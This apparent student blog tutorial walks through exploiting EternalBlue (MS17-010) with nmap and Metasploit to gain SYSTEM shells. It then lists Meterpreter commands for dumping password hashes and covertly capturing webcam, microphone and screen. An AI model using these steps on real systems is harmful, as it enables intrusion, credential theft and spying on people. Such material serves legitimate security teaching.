This week I am going to explain how to utilize the Eternal Blue exploit.  First a little background on how the exploit works.
Is an exploit that uses vulnerabilities in the Windows implementation of the SMB protocol. It allows attackers to remotely execute
arbitrary code and gain access to a network by sending specially crafted packets. This exploit potentially allows attackers access
to the entire network and all devices connected. This was patched with MS17-010 in March of 2017. There are three bugs that allow
this to happen first is a mathematical error when the protocol tries to cast OS/2 FEA to an NT FEA structure that causes a buffer
overflow. Triggering of the buffer overflow is possible because the protocols definition of two subcommands differs. This is 
significant because an error in validation occurs if the client sends a crafted message using the NT_TRANSACT sub-command immediately 
before the TRANSACTION2 one. While the protocol recognizes that two separate sub-commands have been received, it assigns the type
and size of both packets (and allocates memory accordingly) based only on the type of the last one received. Since the last one is
smaller, the first packet will occupy more space than it is allocated.  The third bug allows heap spraying, which allows attackers to
run shell code.  There are a few things that make this exploit so dangerous, the main one is the exploit give you shell access as
system NT.  This exploit can be used a few different operating systems, windows 7, xp, server 2008 are a few.  Even those this 
exploit has been patched for over two years many enterprise companies still utilize these systems.

First to see if a system is even vulnerable to this exploit, you can use any type of recon software, I am going to use nmap.
The command to check for it is:
	
	nmap -sC -sV --script vuln <target IP>

![nmap](https://v1ndl3r.github.io/CIT480/assets/BE.PNG "nmap")

Next you will need to run metasploit framework:
	
	msfconsole 
	search eternal
	use 3

![msfconsole](https://v1ndl3r.github.io/CIT480/assets/EB1.PNG "meta")

	set RHOSTS <target IP>
	run or exploit 
	ctrl+z (to background your session)
	sessions -u 1 (will upgrade your shell)
	migrate <PID> (It is a good idea to migrate your PS)


![options](https://v1ndl3r.github.io/CIT480/assets/EB-1.PNG "options")


![NT SYSTEM](https://v1ndl3r.github.io/CIT480/assets/EB-2.PNG "NT SYSTEM")

You know how full control of the system and can load other exploits or mess with the target.

hashdump - will give you a dump of all the hashes on the machine.
webcam_snap - Will take a picture from the webcam.
webcam_stream -  will give you a live video.
record_mic - will record audio.
screenshot - will take a screenshot of their screen.



